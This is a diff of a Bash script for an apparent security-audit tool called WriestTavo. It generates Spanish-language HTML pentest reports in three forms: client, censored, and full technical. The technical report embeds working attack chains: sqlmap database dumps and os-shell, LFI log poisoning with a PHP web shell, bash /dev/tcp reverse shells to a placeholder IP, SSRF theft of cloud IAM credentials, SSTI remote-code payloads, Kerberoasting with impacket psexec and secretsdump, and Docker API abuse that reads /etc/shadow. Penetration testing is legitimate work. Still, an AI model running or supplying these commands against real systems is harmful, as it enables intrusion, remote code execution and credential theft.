+  section{background:var(--bg2);border-radius:12px;padding:28px;
+          margin-bottom:24px;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid var(--border);}
+  section h2{font-size:18px;font-weight:700;margin-bottom:8px;
+             display:flex;align-items:center;gap:8px;}
+  .section-desc{color:var(--txt2);font-size:14px;margin-bottom:20px;}
+  /* Timeline prioridad */
+  .timeline{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-top:16px;}
+  .timeline-col{border-radius:8px;padding:16px;}
+  .timeline-col.t1{background:#fff1f2;border:1px solid #fecaca;}
+  .timeline-col.t2{background:#fff7ed;border:1px solid #fed7aa;}
+  .timeline-col.t3{background:#f0fdf4;border:1px solid #bbf7d0;}
+  .timeline-col h4{font-size:13px;font-weight:700;margin-bottom:10px;text-transform:uppercase;}
+  .timeline-col.t1 h4{color:var(--red);}
+  .timeline-col.t2 h4{color:var(--orange);}
+  .timeline-col.t3 h4{color:var(--green);}
+  .timeline-col li{font-size:13px;color:var(--txt2);margin-bottom:4px;padding-left:14px;position:relative;}
+  .timeline-col li::before{content:'•';position:absolute;left:0;}
+  /* Finding Cards */
+  .finding-card{background:#fafbfc;border-radius:8px;margin-bottom:16px;
+                overflow:hidden;border:1px solid var(--border);}
+  .card-header{padding:14px 18px;display:flex;align-items:center;gap:10px;
+               flex-wrap:wrap;background:#fff;}
+  .sev-badge{font-size:11px;font-weight:700;color:#fff;padding:3px 10px;
+             border-radius:4px;text-transform:uppercase;letter-spacing:.5px;}
+  .cvss-pill{font-size:11px;font-weight:600;padding:3px 8px;border-radius:4px;
+             background:#f1f5f9;color:var(--txt2);border:1px solid var(--border);}
+  .card-title{font-size:15px;font-weight:600;flex:1;}
+  .payload-confirmed{font-size:11px;font-weight:700;color:#fff;background:#7c3aed;
+                     padding:3px 10px;border-radius:4px;margin-left:auto;}
+  .card-body{padding:16px 18px;}
+  .biz-impact{background:#eff6ff;border-left:3px solid var(--accent);padding:10px 14px;
+              border-radius:0 6px 6px 0;font-size:14px;margin-bottom:12px;}
+  .tech-summary{font-size:13px;color:var(--txt2);margin-bottom:12px;}
+  .remediation-block{background:#f0fdf4;border-left:3px solid var(--green);
+                     padding:10px 14px;border-radius:0 6px 6px 0;font-size:13px;}
+  /* Payloads */
+  .payloads-section h3{font-size:15px;font-weight:600;margin:18px 0 10px;
+                       color:var(--txt);}
+  .payload-table{width:100%;border-collapse:collapse;font-size:13px;margin-bottom:8px;}
+  .payload-table th{background:#f1f5f9;padding:8px 12px;text-align:left;
+                    font-weight:600;border-bottom:2px solid var(--border);}
+  .payload-table td{padding:8px 12px;border-bottom:1px solid var(--border);vertical-align:top;}
+  .payload-table tr:last-child td{border-bottom:none;}
+  .payload-tag{background:#fef3c7;color:#92400e;padding:2px 8px;
+               border-radius:4px;font-family:monospace;font-size:12px;word-break:break-all;}
+  .payload-tag.xss{background:#fce7f3;color:#9d174d;}
+  .payload-tag.lfi{background:#ede9fe;color:#5b21b6;}
+  .payload-tag.ssrf{background:#ecfdf5;color:#065f46;}
+  .url-col{font-family:monospace;font-size:11px;color:var(--txt2);word-break:break-all;max-width:250px;}
+  /* Intel */
+  .intel-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-top:12px;}
+  .intel-chip{background:#f1f5f9;border-radius:6px;padding:8px 12px;font-size:13px;}
+  .intel-chip b{display:block;font-size:11px;color:var(--txt2);text-transform:uppercase;
+                letter-spacing:.5px;margin-bottom:2px;}
+  /* Footer */
+  .footer{background:var(--txt);color:#fff;padding:24px 48px;margin-top:40px;
+          font-size:12px;display:flex;justify-content:space-between;align-items:center;}
+  .footer a{color:#93c5fd;}
+  @media(max-width:640px){.timeline{grid-template-columns:1fr;}.header{padding:24px;}}
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="header-logo">WriestTavo Security Audit v8.0</div>
+  <h1>📋 Informe de Seguridad — Cliente IT</h1>
+  <div class="header-meta">
+    <span>🎯 Target: <b>${TARGET}</b></span>
+    <span>📅 Fecha: <b>$(date '+%d/%m/%Y %H:%M')</b></span>
+    <span>🏷️ Modo: <b>${SCAN_MODE}</b></span>
+  </div>
+</div>
+
+<div class="container">
+
+<!-- RIESGO GLOBAL -->
+<div class="risk-banner">
+  <div class="risk-icon">${risk_icon}</div>
+  <div>
+    <div class="risk-title">Nivel de Riesgo Global: ${risk_level}</div>
+    <div class="risk-desc">Se encontraron <b>${crit} hallazgos críticos</b> y <b>${alto} altos</b> que requieren atención prioritaria. CVSS promedio del scan: <b>${avg_cvss}</b>.</div>
+  </div>
+</div>
+
+<!-- ESTADÍSTICAS -->
+<div class="stats-grid">
+  <div class="stat-card stat-crit"><div class="stat-num">${crit}</div><div class="stat-label">Críticos</div></div>
+  <div class="stat-card stat-high"><div class="stat-num">${alto}</div><div class="stat-label">Altos</div></div>
+  <div class="stat-card stat-med"><div class="stat-num">${med}</div><div class="stat-label">Medios</div></div>
+  <div class="stat-card stat-low"><div class="stat-num">${bajo}</div><div class="stat-label">Bajos</div></div>
+  <div class="stat-card stat-cvss"><div class="stat-num">${avg_cvss}</div><div class="stat-label">CVSS Promedio</div></div>
+</div>
+
+<!-- PLAN DE ACCIÓN -->
+<section>
+  <h2>🗓️ Plan de Acción Priorizado</h2>
+  <p class="section-desc">Organización de hallazgos según urgencia y ventana de remediación recomendada.</p>
+  <div class="timeline">
+    <div class="timeline-col t1">
+      <h4>🔴 Acción Inmediata (0-48h)</h4>
+      <ul>
+$(for f in "${FINDINGS[@]}"; do
+  sev=$(echo "$f"|awk -F'|||' '{print $1}')
+  title=$(echo "$f"|awk -F'|||' '{print $2}')
+  [[ "$sev" == "CRÍTICO" ]] && echo "        <li>${title}</li>"
+done)
+      </ul>
+    </div>
+    <div class="timeline-col t2">
+      <h4>🟠 Próximo Sprint (1-2 semanas)</h4>
+      <ul>
+$(for f in "${FINDINGS[@]}"; do
+  sev=$(echo "$f"|awk -F'|||' '{print $1}')
+  title=$(echo "$f"|awk -F'|||' '{print $2}')
+  [[ "$sev" == "ALTO" ]] && echo "        <li>${title}</li>"
+done)
+      </ul>
+    </div>
+    <div class="timeline-col t3">
+      <h4>🟢 Backlog (30-90 días)</h4>
+      <ul>
+$(for f in "${FINDINGS[@]}"; do
+  sev=$(echo "$f"|awk -F'|||' '{print $1}')
+  title=$(echo "$f"|awk -F'|||' '{print $2}')
+  [[ "$sev" == "MEDIO" || "$sev" == "BAJO" ]] && echo "        <li>${title}</li>"
+done)
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- CONTEXTO TÉCNICO -->
+<section>
+  <h2>🔍 Contexto del Entorno Analizado</h2>
+  <div class="intel-grid">
+    $([ -n "$INTEL_OS" ]              && echo "<div class='intel-chip'><b>Sistema Operativo</b>${INTEL_OS}</div>")
+    $([ -n "$INTEL_CMS" ]             && echo "<div class='intel-chip'><b>CMS Detectado</b>${INTEL_CMS}</div>")
+    $([ -n "$INTEL_FRAMEWORK_BACKEND" ] && echo "<div class='intel-chip'><b>Framework Backend</b>${INTEL_FRAMEWORK_BACKEND}</div>")
+    $([ -n "$INTEL_FRAMEWORK_JS" ]    && echo "<div class='intel-chip'><b>Framework Frontend</b>${INTEL_FRAMEWORK_JS}</div>")
+    $([ -n "$INTEL_WAF_NAME" ]        && echo "<div class='intel-chip'><b>WAF / Firewall</b>${INTEL_WAF_NAME}</div>")
+    $([ "${#INTEL_TECHNOLOGIES[@]}" -gt 0 ] && echo "<div class='intel-chip'><b>Tecnologías</b>${INTEL_TECHNOLOGIES[*]}</div>")
+    $([ -n "$INTEL_CLOUD_PROVIDER" ]  && echo "<div class='intel-chip'><b>Cloud Provider</b>${INTEL_CLOUD_PROVIDER}</div>")
+    $([ "${#INTEL_API_ENDPOINTS[@]}" -gt 0 ] && echo "<div class='intel-chip'><b>API Endpoints</b>${#INTEL_API_ENDPOINTS[@]} descubiertos</div>")
+  </div>
+</section>
+
+<!-- PAYLOADS CONFIRMADOS -->
+${payloads_section}
+
+<!-- HALLAZGOS DETALLADOS -->
+<section>
+  <h2>📌 Hallazgos Detallados</h2>
+  <p class="section-desc">Cada hallazgo incluye impacto de negocio y recomendación de remediación.</p>
+  ${findings_html}
+</section>
+
+</div>
+<div class="footer">
+  <span>WriestTavo v8.0 · Auditoría de Seguridad</span>
+  <span>Target: ${TARGET} · $(date '+%d/%m/%Y') · Confidencial</span>
+</div>
+</body></html>
+CLIENTHTML
+
+    ok "Reporte Cliente IT → ${REPORT_CLIENT}"
+}
+
+# ════════════════════════════════════════════════════════════════
+# REPORTE 2: CENSURADO (Privacidad / Compliance / Legal)
+# ════════════════════════════════════════════════════════════════
+generar_reporte_censurado() {
+    log "Generando Reporte 2: Versión Censurada..."
+    local ts
+    ts=$(date +"%Y%m%d_%H%M%S")
+    REPORT_CENSORED="${OUTPUT_DIR}/reporte_CENSURADO_${ts}.html"
+
+    # Función de censura
+    _censor() {
+        local text="$1"
+        # Censurar IPs
+        text=$(echo "$text" | sed -E 's/([0-9]{1,3}\.){3}[0-9]{1,3}/[IP CENSURADA]/g')
+        # Censurar dominios/URLs
+        text=$(echo "$text" | sed -E 's|https?://[a-zA-Z0-9._/-]+|[URL CENSURADA]|g')
+        # Censurar paths de archivo
+        text=$(echo "$text" | sed -E 's|(/[a-zA-Z0-9._-]+){2,}|[RUTA CENSURADA]|g')
+        # Censurar usuarios (patrones comunes)
+        text=$(echo "$text" | sed -E 's/(user|usuario|admin|username)[=:][^\s<&]+/\1=[USUARIO CENSURADO]/gi')
+        # Censurar passwords
+        text=$(echo "$text" | sed -E 's/(pass(word)?|pwd|clave|contraseña)[=:][^\s<&]+/\1=[CONTRASEÑA CENSURADA]/gi')
+        # Censurar tokens/hashes
+        text=$(echo "$text" | sed -E 's/eyJ[a-zA-Z0-9._-]{20,}/[TOKEN JWT CENSURADO]/g')
+        text=$(echo "$text" | sed -E 's/[A-Fa-f0-9]{32,}([^a-zA-Z0-9]|$)/[HASH CENSURADO]\1/g')
+        # Remover bloques de código con comandos de explotación
+        text=$(echo "$text" | sed -E 's/<code>[^<]{0,500}<\/code>/[COMANDO TÉCNICO OMITIDO]/g')
+        text=$(echo "$text" | sed -E 's/<pre>[^<]{0,2000}<\/pre>/[SALIDA TÉCNICA OMITIDA]/g')
+        echo "$text"
+    }
+
+    # Conteos
+    local crit=0 alto=0 med=0 bajo=0 info_c=0
+    for f in "${FINDINGS[@]}"; do
+        case $(echo "$f"|awk -F'|||' '{print $1}') in
+            CRÍTICO) ((crit++)) ;;  ALTO) ((alto++)) ;;
+            MEDIO)   ((med++))  ;;  BAJO) ((bajo++)) ;;
+            *)       ((info_c++)) ;;
+        esac
+    done
+
+    local findings_censored=""
+    for finding in "${FINDINGS[@]}"; do
+        local sev title detail cvss rem
+        sev=$(echo    "$finding" | awk -F'|||' '{print $1}')
+        title=$(echo  "$finding" | awk -F'|||' '{print $2}')
+        detail=$(echo "$finding" | awk -F'|||' '{print $3}')
+        cvss=$(echo   "$finding" | awk -F'|||' '{print $4}')
+        rem=$(echo    "$finding" | awk -F'|||' '{print $5}')
+
+        [[ "$sev" == "INFO" ]] && continue
+
+        local color="#5bc0de"
+        case "$sev" in CRÍTICO) color="#dc2626" ;; ALTO) color="#ea580c" ;;
+                        MEDIO)   color="#d97706" ;; BAJO) color="#16a34a" ;; esac
+
+        # Censura AGRESIVA — solo el tipo de vulnerabilidad, no detalles
+        local censored_title
+        censored_title=$(echo "$title" | sed -E 's/ en [^ ]+$/ en [SISTEMA CENSURADO]/' \
+            | sed -E 's/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[IP]/')
+        local censored_detail
+        censored_detail=$(_censor "${detail:0:300}")
+        local censored_rem
+        censored_rem=$(_censor "$rem")
+
+        findings_censored+="<tr>"
+        findings_censored+="<td><span class='sev' style='background:${color};'>${sev}</span></td>"
+        findings_censored+="<td>${censored_title}</td>"
+        findings_censored+="<td>${cvss}</td>"
+        findings_censored+="<td style='color:#6b7280;font-size:12px;'>${censored_detail}</td>"
+        findings_censored+="<td style='font-size:12px;'>${censored_rem}</td>"
+        findings_censored+="</tr>"
+    done
+
+    cat > "$REPORT_CENSORED" << CENSORHTML
+<!DOCTYPE html><html lang="es"><head>
+<meta charset="UTF-8">
+<title>Informe de Seguridad — Versión Censurada</title>
+<style>
+  body{font-family:'Segoe UI',system-ui,sans-serif;background:#f9fafb;color:#111827;margin:0;}
+  .header{background:#111827;color:#fff;padding:32px 48px;}
+  .header h1{font-size:24px;font-weight:700;margin-bottom:4px;}
+  .header .subtitle{font-size:13px;color:#9ca3af;}
+  .confidential-banner{background:#fef3c7;border:2px solid #f59e0b;padding:14px 48px;
+    display:flex;align-items:center;gap:12px;font-weight:600;color:#92400e;font-size:14px;}
+  .privacy-note{background:#eff6ff;border:1px solid #bfdbfe;margin:20px 40px;padding:16px 24px;
+    border-radius:8px;font-size:13px;color:#1e40af;}
+  .container{max-width:1100px;margin:0 auto;padding:24px 40px;}
+  .stats-row{display:flex;gap:12px;margin-bottom:28px;flex-wrap:wrap;}
+  .stat{background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:16px 20px;
+    text-align:center;min-width:100px;}
+  .stat-n{font-size:28px;font-weight:800;}
+  .stat-l{font-size:11px;color:#6b7280;text-transform:uppercase;margin-top:4px;}
+  .redacted{background:#374151;color:#374151;border-radius:3px;user-select:none;
+    cursor:not-allowed;padding:0 6px;}
+  .redacted::after{content:'████';color:#374151;}
+  .censored-note{font-size:11px;color:#9ca3af;font-style:italic;}
+  table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;
+    overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1);}
+  th{background:#f3f4f6;padding:12px 16px;text-align:left;font-size:12px;
+    font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:#6b7280;}
+  td{padding:12px 16px;border-bottom:1px solid #f3f4f6;vertical-align:top;font-size:13px;}
+  tr:last-child td{border-bottom:none;}
+  .sev{font-size:10px;font-weight:700;color:#fff;padding:2px 8px;
+    border-radius:4px;text-transform:uppercase;}
+  .vuln-type-tag{display:inline-block;background:#f3f4f6;border:1px solid #e5e7eb;
+    border-radius:4px;padding:2px 8px;font-size:11px;color:#374151;}
+  .section-title{font-size:17px;font-weight:700;margin:28px 0 14px;
+    padding-bottom:8px;border-bottom:2px solid #e5e7eb;}
+  .disclaimer{background:#f9fafb;border:1px solid #e5e7eb;padding:16px 24px;
+    border-radius:8px;font-size:12px;color:#6b7280;margin-top:28px;}
+  .footer{background:#111827;color:#6b7280;padding:16px 48px;
+    font-size:12px;text-align:center;margin-top:40px;}
+</style>
+</head><body>
+<div class="header">
+  <h1>🔒 Informe de Seguridad — Versión Censurada</h1>
+  <div class="subtitle">Documento de distribución controlada · Datos sensibles omitidos por política de privacidad</div>
+</div>
+
+<div class="confidential-banner">
+  ⚠️ CONFIDENCIAL — DISTRIBUCIÓN RESTRINGIDA &nbsp;|&nbsp;
+  Este documento ha sido procesado para remover información técnica sensible, rutas de explotación y datos de infraestructura.
+</div>
+
+<div class="privacy-note">
+  <b>📋 Nota de Privacidad:</b> Este informe ha sido editado para cumplir con políticas internas de privacidad y protección de datos.
+  Las IPs, URLs específicas, credenciales, hashes, tokens, rutas del sistema y comandos de explotación han sido
+  reemplazados por <span class="redacted"></span>. Para el informe técnico completo, solicitar al equipo de seguridad con las autorizaciones correspondientes.
+</div>
+
+<div class="container">
+  <p style="font-size:13px;color:#6b7280;margin-bottom:20px;">
+    <b>Objetivo auditado:</b> <span class="redacted"></span> &nbsp;|&nbsp;
+    <b>Fecha:</b> $(date '+%d/%m/%Y') &nbsp;|&nbsp;
+    <b>Tipo:</b> Auditoría de Seguridad Web / Infraestructura
+  </p>
+
+  <div class="stats-row">
+    <div class="stat"><div class="stat-n" style="color:#dc2626;">${crit}</div><div class="stat-l">Críticos</div></div>
+    <div class="stat"><div class="stat-n" style="color:#ea580c;">${alto}</div><div class="stat-l">Altos</div></div>
+    <div class="stat"><div class="stat-n" style="color:#d97706;">${med}</div><div class="stat-l">Medios</div></div>
+    <div class="stat"><div class="stat-n" style="color:#16a34a;">${bajo}</div><div class="stat-l">Bajos</div></div>
+    <div class="stat"><div class="stat-n" style="color:#6b7280;">${info_c}</div><div class="stat-l">Info</div></div>
+  </div>
+
+  <div class="section-title">📋 Resumen de Vulnerabilidades (Censurado)</div>
+  <table>
+    <thead><tr>
+      <th>Severidad</th><th>Tipo de Vulnerabilidad</th>
+      <th>CVSS</th><th>Descripción General</th><th>Remediación</th>
+    </tr></thead>
+    <tbody>${findings_censored}</tbody>
+  </table>
+
+  $(if (( ${#EFFECTIVE_PAYLOADS[@]} > 0 )); then
+    echo "<div class='section-title'>⚠ Técnicas de Ataque Detectadas (Sin Detalles)</div>"
+    echo "<table><thead><tr><th>Categoría</th><th>Estado</th><th>Nota</th></tr></thead><tbody>"
+    echo "$INTEL_SQLI_FOUND"  == "true" && echo "<tr><td>SQL Injection</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Parámetros afectados omitidos por política de privacidad.</td></tr>"
+    echo "$INTEL_XSS_FOUND"   == "true" && echo "<tr><td>Cross-Site Scripting</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Puntos de inyección omitidos.</td></tr>"
+    echo "$INTEL_LFI_FOUND"   == "true" && echo "<tr><td>Local File Inclusion</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Rutas accedidas omitidas.</td></tr>"
+    echo "$INTEL_SSRF_FOUND"  == "true" && echo "<tr><td>SSRF</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Endpoints internos alcanzados omitidos.</td></tr>"
+    echo "</tbody></table>"
+  fi)
+
+  <div class="disclaimer">
+    <b>Descargo de responsabilidad:</b> Este documento ha sido generado automáticamente por WriestTavo v8.0 y posteriormente
+    procesado para eliminar información sensible. El equipo de seguridad conserva el informe técnico completo.
+    Este documento es válido únicamente como resumen para terceros autorizados y no reemplaza al informe técnico original.
+    Las vulnerabilidades listadas fueron identificadas durante la ventana de auditoría autorizada. No reproducir ni distribuir sin autorización.
+  </div>
+</div>
+<div class="footer">WriestTavo Security Audit v8.0 · Informe Censurado · $(date '+%d/%m/%Y')</div>
+</body></html>
+CENSORHTML
+
+    ok "Reporte Censurado → ${REPORT_CENSORED}"
+}
+
+# ════════════════════════════════════════════════════════════════
+# REPORTE 3: PENTESTER — TÉCNICO COMPLETO
+# ════════════════════════════════════════════════════════════════
+generar_reporte_pentester() {
+    log "Generando Reporte 3: Pentester Técnico..."
+    local ts
+    ts=$(date +"%Y%m%d_%H%M%S")
+    REPORT_PENTESTER="${OUTPUT_DIR}/reporte_PENTESTER_${TARGET//[^a-zA-Z0-9]/_}_${ts}.html"
+
+    # Construir rutas de ataque sugeridas según INTEL
+    local attack_chains=""
+
+    # Chain 1: SQLi → DB dump
+    if [[ "$INTEL_SQLI_FOUND" == "true" ]]; then
+        local db_type="${INTEL_TECHNOLOGIES[*]}"
+        local tamper_flag=""
+        [[ "$INTEL_WAF_DETECTED" == "true" ]] && tamper_flag="--tamper=between,charencode,space2comment --level=5 --risk=3"
+        attack_chains+="
+        <div class='chain critical'>
+          <div class='chain-header'>💉 SQLi → Database Dump → Credenciales</div>
+          <div class='chain-steps'>
+            <div class='step'>
+              <div class='step-num'>1</div>
+              <div class='step-body'>
+                <b>Confirmar con sqlmap</b>
+                <code>sqlmap -u \"URL_VULNERABLE?param=1\" --dbs --batch ${tamper_flag}</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>2</div>
+              <div class='step-body'>
+                <b>Dump tabla de usuarios</b>
+                <code>sqlmap -u \"URL_VULNERABLE\" -D DB_NAME -T users --dump --batch</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>3</div>
+              <div class='step-body'>
+                <b>Crackear hashes con hashcat</b>
+                <code>hashcat -m 0 hashes.txt rockyou.txt --force</code>
+                <code>hashcat -m 3200 bcrypt_hashes.txt rockyou.txt -O</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>4</div>
+              <div class='step-body'>
+                <b>Si MySQL con FILE privilege → RCE</b>
+                <code>sqlmap -u \"URL\" --os-shell --batch</code>
+              </div>
+            </div>
+          </div>
+        </div>"
+    fi
+
+    # Chain 2: LFI → Log Poisoning → RCE
+    if [[ "$INTEL_LFI_FOUND" == "true" ]]; then
+        attack_chains+="
+        <div class='chain critical'>
+          <div class='chain-header'>📂 LFI → Log Poisoning → RCE</div>
+          <div class='chain-steps'>
+            <div class='step'>
+              <div class='step-num'>1</div>
+              <div class='step-body'>
+                <b>Confirmar LFI en parámetro detectado</b>
+                <code>curl -k \"${INTEL_LFI_URL:-TARGET}?${INTEL_LFI_PARAM:-file}=../../../etc/passwd\"</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>2</div>
+              <div class='step-body'>
+                <b>PHP Wrapper — leer código fuente</b>
+                <code>curl -k \"URL?param=php://filter/convert.base64-encode/resource=index.php\" | base64 -d</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>3</div>
+              <div class='step-body'>
+                <b>Log Poisoning via User-Agent</b>
+                <code>curl -k -A '&lt;?php system(\$_GET[\"cmd\"]); ?&gt;' TARGET</code>
+                <code>curl -k \"URL?param=/var/log/apache2/access.log&cmd=id\"</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>4</div>
+              <div class='step-body'>
+                <b>Reverse shell desde RCE</b>
+                <code>curl -k \"URL?param=/var/log/nginx/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'\"</code>
+              </div>
+            </div>
+          </div>
+        </div>"
+    fi
+
+    # Chain 3: SSRF → Cloud Metadata
+    if [[ "$INTEL_SSRF_FOUND" == "true" ]]; then
+        local meta_url="http://169.254.169.254/latest/meta-data/"
+        [[ "$INTEL_CLOUD_PROVIDER" == "gcp"   ]] && meta_url="http://metadata.google.internal/computeMetadata/v1/"
+        [[ "$INTEL_CLOUD_PROVIDER" == "azure" ]] && meta_url="http://169.254.169.254/metadata/instance"
+        attack_chains+="
+        <div class='chain critical'>
+          <div class='chain-header'>🌐 SSRF → Cloud Metadata → Credenciales AWS/GCP/Azure</div>
+          <div class='chain-steps'>
+            <div class='step'>
+              <div class='step-num'>1</div>
+              <div class='step-body'>
+                <b>Acceder a metadata (${INTEL_CLOUD_PROVIDER:-cloud})</b>
+                <code>curl -k \"${INTEL_SSRF_URL:-TARGET}?url=${meta_url}\"</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>2</div>
+              <div class='step-body'>
+                <b>Obtener IAM credentials (AWS)</b>
+                <code>curl -k \"URL?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\"</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>3</div>
+              <div class='step-body'>
+                <b>Usar credenciales con AWS CLI</b>
+                <code>export AWS_ACCESS_KEY_ID=KEY; export AWS_SECRET_ACCESS_KEY=SECRET; export AWS_SESSION_TOKEN=TOKEN</code>
+                <code>aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances</code>
+              </div>
+            </div>
+          </div>
+        </div>"
+    fi
+
+    # Chain 4: SSTI → RCE
+    if [[ "$INTEL_SSTI_FOUND" == "true" ]]; then
+        local ssti_payload='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
+        [[ "$INTEL_FRAMEWORK_BACKEND" == "twig" || "$INTEL_CMS" == "drupal" ]] && \
+            ssti_payload='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
+        attack_chains+="
+        <div class='chain critical'>
+          <div class='chain-header'>🧩 SSTI → RCE (${INTEL_FRAMEWORK_BACKEND:-engine detectado})</div>
+          <div class='chain-steps'>
+            <div class='step'>
+              <div class='step-num'>1</div>
+              <div class='step-body'>
+                <b>Confirmar motor de templates</b>
+                <code>{{7*7}} → 49 (Jinja2/Twig) | #{7*7} → 49 (Ruby ERB) | \${7*7} → 49 (Freemarker)</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>2</div>
+              <div class='step-body'>
+                <b>Payload RCE — ${INTEL_FRAMEWORK_BACKEND:-Jinja2}</b>
+                <code>${ssti_payload}</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>3</div>
+              <div class='step-body'>
+                <b>Reverse shell</b>
+                <code>{{config.__class__.__init__.__globals__["os"].popen("bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'").read()}}</code>
+              </div>
+            </div>
+          </div>
+        </div>"
+    fi
+
+    # Chain 5: AD Kerberoasting
+    if (( ${#AD_KERBEROASTABLE[@]} > 0 )); then
+        attack_chains+="
+        <div class='chain critical'>
+          <div class='chain-header'>🏢 Kerberoasting → DA (${#AD_KERBEROASTABLE[@]} cuentas)</div>
+          <div class='chain-steps'>
+            <div class='step'>
+              <div class='step-num'>1</div>
+              <div class='step-body'>
+                <b>Obtener TGS hashes</b>
+                <code>impacket-GetUserSPNs '${AD_DOMAIN_FQDN}/${AD_USER}:${AD_PASS}' -dc-ip ${AD_DC_IP} -request -outputfile ${OUTPUT_DIR}/kerberoast.hashes</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>2</div>
+              <div class='step-body'>
+                <b>Crackear con hashcat</b>
+                <code>hashcat -m 13100 ${OUTPUT_DIR}/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force</code>
+                <code>hashcat -m 13100 ${OUTPUT_DIR}/kerberoast.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code>
+              </div>
+            </div>
+            <div class='step'>
+              <div class='step-num'>3</div>
+              <div class='step-body'>
+                <b>Pass-the-Hash / Pass-the-Ticket si se crackea</b>
+                <code>impacket-psexec DOMAIN/SERVICE_ACCOUNT@${AD_DC_IP}</code>
+                <code>impacket-secretsdump DOMAIN/SERVICE_ACCOUNT@${AD_DC_IP} -just-dc-ntlm</code>
+              </div>
+            </div>
+          </div>
+        </div>"
+    fi
+
+    # Construir todos los hallazgos técnicos COMPLETOS
+    local all_findings_html=""
+    local prev_sev=""
+    for finding in "${FINDINGS[@]}"; do
+        local sev title detail cvss rem next_step
+        sev=$(echo       "$finding" | awk -F'|||' '{print $1}')
+        title=$(echo     "$finding" | awk -F'|||' '{print $2}')
+        detail=$(echo    "$finding" | awk -F'|||' '{print $3}')
+        cvss=$(echo      "$finding" | awk -F'|||' '{print $4}')
+        rem=$(echo       "$finding" | awk -F'|||' '{print $5}')
+        next_step=$(echo "$finding" | awk -F'|||' '{print $6}')
+
+        if [[ "$sev" != "$prev_sev" ]]; then
+            [[ -n "$prev_sev" ]] && all_findings_html+="</div>"
+            all_findings_html+="<div class='sev-group'>"
+            all_findings_html+="<div class='sev-group-header sev-${sev,,}'>${sev}</div>"
+            prev_sev="$sev"
+        fi
+
+        local border_color="#444"
+        case "$sev" in
+            CRÍTICO) border_color="#ff2d2d" ;;
+            ALTO)    border_color="#ff6b35" ;;
+            MEDIO)   border_color="#ffd23f" ;;
+            BAJO)    border_color="#57cc99" ;;
+            INFO)    border_color="#58a6ff" ;;
+        esac
+
+        all_findings_html+="<div class='finding' style='border-left:3px solid ${border_color};'>"
+        all_findings_html+="<div class='f-title'>"
+        all_findings_html+="<span class='f-sev' style='background:${border_color};'>${sev}</span>"
+        all_findings_html+="<span class='f-name'>${title}</span>"
+        [[ -n "$cvss" && "$cvss" != "N/A" ]] && \
+            all_findings_html+="<span class='cvss-tag' style='border-color:${border_color};color:${border_color};'>CVSS ${cvss}</span>"
+        all_findings_html+="</div>"
+        all_findings_html+="<div class='f-detail'>${detail}</div>"
+        [[ -n "$rem" ]] && all_findings_html+="<div class='f-rem'><span class='label'>🔧 Remediación</span>${rem}</div>"
+        [[ -n "$next_step" ]] && all_findings_html+="<div class='f-next'><span class='label'>⚡ Next Step</span><code>${next_step}</code></div>"
+        all_findings_html+="</div>"
+    done
+    [[ -n "$prev_sev" ]] && all_findings_html+="</div>"
+
+    # Tips para exploración manual
+    local manual_tips=""
+    [[ -n "$INTEL_GRAPHQL_URL" ]] && manual_tips+="
+    <div class='tip'>
+      <div class='tip-title'>🔍 GraphQL Introspection</div>
+      <code>curl -k -X POST '${INTEL_GRAPHQL_URL}' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}' | python3 -m json.tool</code>
+      <code>graphw00f -t ${TARGET} -f  # Fingerprinting del engine</code>
+      <code>clairvoyance ${INTEL_GRAPHQL_URL}  # Fuerza bruta de schema</code>
+    </div>"
+
+    [[ -n "$INTEL_SWAGGER_URL" ]] && manual_tips+="
+    <div class='tip'>
+      <div class='tip-title'>📖 Swagger/OpenAPI Fuzzing</div>
+      <code>curl -k '${INTEL_SWAGGER_URL}' | python3 -m json.tool > swagger.json</code>
+      <code>python3 swagger-codegen.py swagger.json  # Generar tests automáticos</code>
+      <code>arjun --openapi swagger.json -u ${TARGET}  # Probar parámetros</code>
+    </div>"
+
+    [[ "$INTEL_DOCKER_EXPOSED" == "true" ]] && manual_tips+="
+    <div class='tip'>
+      <div class='tip-title'>🐋 Docker API → RCE</div>
+      <code>docker -H tcp://${TARGET}:2375 ps  # Ver contenedores</code>
+      <code>docker -H tcp://${TARGET}:2375 run -v /:/mnt alpine cat /mnt/etc/shadow  # LPE</code>
+      <code>docker -H tcp://${TARGET}:2375 exec -it CONTAINER_ID /bin/sh  # Shell en contenedor</code>
+    </div>"
+
